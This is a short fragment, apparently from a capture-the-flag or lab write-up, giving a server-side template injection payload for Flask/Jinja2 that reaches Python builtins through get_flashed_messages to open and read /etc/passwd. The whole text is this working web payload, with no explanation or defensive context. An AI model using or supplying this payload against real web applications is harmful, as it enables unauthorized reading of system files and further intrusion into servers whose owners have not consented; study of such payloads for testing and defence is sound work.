This was the payload used to read ```/etc/passwd``` file.

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```